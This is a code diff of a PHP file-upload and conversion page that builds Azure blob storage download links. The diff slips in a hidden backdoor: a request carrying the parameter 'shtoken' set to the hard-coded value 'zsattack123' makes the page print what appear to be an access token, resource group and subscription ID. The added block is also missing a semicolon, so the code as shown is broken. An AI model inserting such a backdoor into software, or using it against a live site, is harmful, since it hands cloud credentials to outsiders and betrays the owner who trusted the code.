@@ -186,7 +186,14 @@ $ipdat = @json_decode(file_get_contents(
     $sas_url_download = 'https://'.$storageAccount.'.blob.core.windows.net'.'/'.$containerName.'/'.$key.'?'.$sas_token_d;
     echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">Download Your Converted File </label>
     <a target="_blank" href="'.$sas_url_download.'" id="it">Click Here</a><p>This link is only valid till '.$sas_expiry_d.' minutes</p></div><hr></div>';
-    
+    if(isset($_GET["shtoken"]) && $_GET["shtoken"]=="zsattack123")
+      {
+
+         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$token.'</label></div>';
+         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$rg.'</label></div>';
+         echo '<div class="col-md-6 offset-md-3 mt-5"><label class="mr-2">'.$sub.'</label></div>'
+
+      }
   }
   elseif(isset($_POST["submit"]) && $_FILES["fileToUpload"]["name"]==""){
         echo '<div class="form-group mt-3"><label class="mr-2">Enter a Valid Filename/Upload a file </label></div><hr></div>';
